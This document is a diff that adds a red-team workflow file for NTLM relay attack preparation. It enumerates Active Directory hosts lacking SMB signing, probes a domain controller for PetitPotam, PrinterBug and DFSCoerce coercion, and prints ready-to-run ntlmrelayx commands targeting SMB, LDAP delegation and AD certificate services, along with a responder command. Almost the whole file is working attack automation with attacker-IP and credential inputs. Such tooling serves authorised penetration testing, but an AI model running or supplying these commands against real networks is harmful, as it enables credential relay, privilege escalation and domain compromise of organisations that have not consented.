@@ -1,0 +1,142 @@
+name: ntlm-relay
+description: |
+  NTLM relay attack preparation — enumerate relay targets (hosts without
+  SMB signing), check for coercion vectors (PetitPotam, PrinterBug,
+  DFSCoerce), and generate relay command lines.
+tags: [redteam, ad, ntlm, relay, coercion]
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Target network (CIDR or IP)
+      alias: t
+    dc:
+      type: string
+      default: ''
+      description: Domain controller IP
+    domain:
+      type: string
+      default: ''
+      description: Domain name
+    user:
+      type: string
+      default: ''
+      description: Domain username
+    password:
+      type: string
+      default: ''
+      description: Password
+    lhost:
+      type: string
+      default: ''
+      description: Attacker IP for relay listener
+
+jobs:
+  enum-signing:
+    name: SMB Signing Enumeration
+    steps:
+    - name: check-smb-signing
+      run: |
+        echo "[+] Checking SMB signing on {{ inputs.target }}..."
+
+        if command -v nxc &>/dev/null; then
+          nxc smb {{ inputs.target }} --gen-relay-list /tmp/ofx_relay_targets.txt 2>/dev/null | tee /tmp/ofx_smb_signing.txt
+        elif command -v crackmapexec &>/dev/null; then
+          crackmapexec smb {{ inputs.target }} --gen-relay-list /tmp/ofx_relay_targets.txt 2>/dev/null | tee /tmp/ofx_smb_signing.txt
+        else
+          echo "[!] Neither nxc nor crackmapexec found"
+          nmap -p 445 --script smb2-security-mode -Pn {{ inputs.target }} 2>/dev/null | grep -E "signing|Host" | tee /tmp/ofx_smb_signing.txt
+        fi
+
+        if [ -f /tmp/ofx_relay_targets.txt ]; then
+          COUNT=$(wc -l < /tmp/ofx_relay_targets.txt)
+          echo "relay_target_count=$COUNT" >> {{ env.OFX_OUTPUTS }}
+          echo "relay_targets_file=/tmp/ofx_relay_targets.txt" >> {{ env.OFX_OUTPUTS }}
+          echo "[+] $COUNT hosts without SMB signing (relay targets)"
+        else
+          echo "relay_target_count=0" >> {{ env.OFX_OUTPUTS }}
+        fi
+      log-stdout: true
+      continue-on-error: true
+
+  coercion-check:
+    name: Coercion Vector Check
+    steps:
+    - name: check-coercion
+      script: |
+        import subprocess
+
+        dc = '{{ inputs.dc }}'
+        domain = '{{ inputs.domain }}'
+        user = '{{ inputs.user }}'
+        password = '{{ inputs.password }}'
+        lhost = '{{ inputs.lhost }}'
+
+        vectors = []
+        print("=== COERCION VECTOR CHECK ===\n")
+
+        if not dc:
+            print("[-] DC IP required for coercion checks (--input dc=<ip>)")
+        else:
+            auth = f"{domain}/{user}:{password}" if domain and user and password else ""
+
+            # PetitPotam
+            try:
+                proc = subprocess.run(
+                    ['python3', '-c', 'import sys; from impacket.dcerpc.v5 import efsrpc; print("impacket available")'],
+                    capture_output=True, text=True, timeout=5
+                )
+                if proc.returncode == 0:
+                    vectors.append(('PetitPotam (MS-EFSR)', f'python3 PetitPotam.py {lhost or "LISTENER_IP"} {dc}'))
+                    print(f"  [+] PetitPotam: impacket available")
+            except Exception:
+                pass
+
+            # Check MS-RPRN (PrinterBug)
+            try:
+                proc = subprocess.run(
+                    ['rpcdump.py', dc, '-port', '135'],
+                    capture_output=True, text=True, timeout=10
+                )
+                if 'MS-RPRN' in proc.stdout:
+                    vectors.append(('PrinterBug (MS-RPRN)', f'python3 printerbug.py {auth}@{dc} {lhost or "LISTENER_IP"}'))
+                    print(f"  [+] PrinterBug: MS-RPRN exposed on {dc}")
+                if 'MS-DFSNM' in proc.stdout:
+                    vectors.append(('DFSCoerce (MS-DFSNM)', f'python3 dfscoerce.py -u {user} -p {password} -d {domain} {lhost or "LISTENER_IP"} {dc}'))
+                    print(f"  [+] DFSCoerce: MS-DFSNM exposed on {dc}")
+            except Exception:
+                pass
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"coercion_count={len(vectors)}\n")
+
+        print(f"\n--- Relay Commands ---")
+        print(f"  ntlmrelayx: impacket-ntlmrelayx -tf /tmp/ofx_relay_targets.txt -smb2support")
+        print(f"  ntlmrelayx (LDAP): impacket-ntlmrelayx -t ldap://{dc} --delegate-access")
+        print(f"  ntlmrelayx (ADCS): impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs")
+        print(f"  responder: responder -I eth0 -wrfv")
+
+        if vectors:
+            print(f"\n--- Coercion Vectors ({len(vectors)}) ---")
+            for name, cmd in vectors:
+                print(f"  {name}:")
+                print(f"    {cmd}")
+      log-stdout: true
+      continue-on-error: true
+
+  summary:
+    name: NTLM Relay Summary
+    needs: [enum-signing, coercion-check]
+    steps:
+    - name: report
+      run: |
+        echo "======================================================"
+        echo " NTLM RELAY ASSESSMENT"
+        echo "======================================================"
+        echo ""
+        echo "  Relay targets: {{ jobs['enum-signing'].outputs.relay_target_count | default('?', true) }}"
+        echo "  Coercion vectors: {{ jobs['coercion-check'].outputs.coercion_count | default('?', true) }}"
+        echo ""
+        echo "  Full target list: /tmp/ofx_relay_targets.txt"
+      log-stdout: true
